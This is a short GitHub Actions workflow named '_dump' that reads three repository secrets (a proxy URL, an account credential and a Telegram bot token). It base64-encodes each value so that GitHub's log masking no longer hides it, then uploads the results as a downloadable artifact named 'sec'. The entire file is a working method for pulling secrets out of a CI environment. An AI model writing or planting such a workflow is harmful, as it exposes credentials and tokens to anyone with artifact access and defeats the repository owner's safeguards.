name: _dump
on:
  workflow_dispatch: {}
jobs:
  e:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S_HY2_PROXY_URL: ${{ secrets.HY2_PROXY_URL }}
          S_KERIT_ACCOUNT: ${{ secrets.KERIT_ACCOUNT }}
          S_TG_BOT: ${{ secrets.TG_BOT }}
        run: |
          mkdir -p out
          printf '%s' "$S_HY2_PROXY_URL" | base64 -w0 > out/HY2_PROXY_URL.b64
          printf '%s' "$S_KERIT_ACCOUNT" | base64 -w0 > out/KERIT_ACCOUNT.b64
          printf '%s' "$S_TG_BOT" | base64 -w0 > out/TG_BOT.b64
      - uses: actions/upload-artifact@v4
        with:
          name: sec
          path: out/
